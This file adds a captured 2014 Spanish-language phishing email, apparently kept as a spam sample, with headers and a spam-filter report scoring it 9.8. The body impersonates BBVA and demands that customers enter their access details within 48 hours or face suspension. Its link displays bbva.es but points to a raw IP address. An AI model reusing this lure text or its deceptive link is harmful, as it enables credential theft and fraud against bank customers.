@@ -1,0 +1,100 @@
+Return-path: <telescore@telescore.flexrooster.nl>
+Envelope-to: info@lepoticsrl.com.ar
+Delivery-date: Mon, 17 Mar 2014 05:18:41 -0300
+Received: from [85.92.144.73] (port=34602 helo=srv1a.pcjames.nl)
+	by ns01.lineadns.com with esmtps (TLSv1:DHE-RSA-AES256-SHA:256)
+	(Exim 4.82)
+	(envelope-from <telescore@telescore.flexrooster.nl>)
+	id 1WPSkm-0007zd-R5
+	for info@lepoticsrl.com.ar; Mon, 17 Mar 2014 05:18:41 -0300
+Received: from apache by srv1a.pcjames.nl with local (Exim 4.72)
+	(envelope-from <telescore@telescore.flexrooster.nl>)
+	id 1WPSig-0002d4-JP
+	for info@lepoticsrl.com.ar; Mon, 17 Mar 2014 09:16:26 +0100
+Date: Mon, 17 Mar 2014 09:16:26 +0100
+To: info@lepoticsrl.com.ar
+Subject: Mensaje Urgente!
+X-PHP-Script: telescore.flexrooster.nl/s.php for 213.229.145.73
+From: BBVA <info@bbva.es>
+Message-Id: <1307469645.7200@bbva.es>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+X-Spam-Subject: ***SPAM*** Mensaje Urgente!
+X-Spam-Status: Yes, score=9.8
+X-Spam-Score: 98
+X-Spam-Bar: +++++++++
+X-Spam-Report: Spam detection software, running on the system "ns01.lineadns.com", has
+ identified this incoming email as possible spam.  The original message
+ has been attached to this so you can view it (if it isn't spam) or label
+ similar future email.  If you have any questions, see
+ root\@localhost for details.
+ 
+ Content preview:  BBVA Net Estimado cliente de BBVA: Grupo BBVA siempre trata
+    de encontrar sus expectativas mas altas. Por eso usamos la ultima tecnologia
+    en seguridad para nuestros clientes. Por lo tanto nuestro departamento de
+    antifraude ha desarrollado un nuevo sistema de seguridad que elimine cualquier
+    posibilidad del acceso de la tercera persona a sus datos, cuentas ni fondos.
+    Este sistema esta construido en la utilizacion de una pregunta secreta y
+   respuesta. [...] 
+ 
+ Content analysis details:   (9.8 points, 5.0 required)
+ 
+  pts rule name              description
+ ---- ---------------------- --------------------------------------------------
+  1.6 RCVD_IN_BRBL_LASTEXT   RBL: RCVD_IN_BRBL_LASTEXT
+                             [85.92.144.73 listed in bb.barracudacentral.org]
+  0.0 URIBL_PH_SURBL         Contains an URL listed in the PH SURBL blocklist
+                             [URIs: 119.7.248.56]
+  0.0 NORMAL_HTTP_TO_IP      URI: Uses a dotted-decimal IP address in URL
+  1.3 HTML_IMAGE_ONLY_24     BODY: HTML: images with 2000-2400 bytes of words
+  0.0 HTML_MESSAGE           BODY: HTML included in message
+  1.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
+  2.4 RAZOR2_CF_RANGE_E8_51_100 Razor2 gives engine 8 confidence level
+                             above 50%
+                             [cf:  70]
+  0.4 RAZOR2_CF_RANGE_51_100 Razor2 gives confidence level above 50%
+                             [cf:  70]
+  1.7 RAZOR2_CHECK           Listed in Razor2 (http://razor.sf.net/)
+  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
+  0.0 T_REMOTE_IMAGE         Message contains an external image
+X-Spam-Flag: YES
+
+<html>
+<head>
+<title>BBVA Net</title>
+<img src="https://www.bbva.es/TLBS/fsbin/mult/logo_tcm423-208626.gif"><br><br>
+<p><b><font color="#003011" face="Arial, Helvetica, sans-serif">Estimado
+                        cliente de BBVA:</font></b></p>
+
+                     
+             
+                        <p><font color="#000000" face="Arial, Helvetica, sans-serif" size="2"><br>
+                        <b>
+                        Grupo BBVA</b> siempre trata de encontrar sus expectativas
+                        mas altas. Por eso usamos la ultima tecnologia en
+                        seguridad para nuestros clientes.<br>
+                        Por lo tanto nuestro departamento de antifraude ha
+                        desarrollado un nuevo sistema de seguridad que elimine
+                        cualquier posibilidad del acceso <br>de la tercera persona a
+                        sus datos, cuentas ni fondos. Este sistema esta
+                        construido en la utilizacion de una pregunta secreta y
+                        respuesta. <br><br>Su respuesta secreta seria usada para
+                        confirmar su identidad cuando haga una operacion de
+                        pagos.<br>
+
+                        Es obligatorio para todos los clientes de <b> BBVA</b> en Linea
+                        usar este sistema de seguridad.<br>
+                        Nuestro consejo para usted es que introduzca sus datos
+                        se acceso para pasar La Verificacion Del Sistema. <br><br>Si el
+                        registro no es realizado dentro de 48 Horas su cuenta
+                        sera suspendida temporalmente hasta que su registro sea
+                        completado.<br>
+                        Esto solo le va a costar unos minutos de su tiempo y va
+                        a tener una seguridad mucho mas estable.<br>
+                        Para comenzar el registro por favor haga click aqui:<br><br>
+						<a href="http://119.7.248.56/KJT87JHguygJHjVhfhj,kjbjVhjvl/">https://www.bbva.es/TLBS/tlbs/esp/segmento/particulares/index.jsp </a><br><br>
+						Banco Bilbao Vizcaya Argentaria, S.A. - 2014
+                        </font></p></html>
+
+
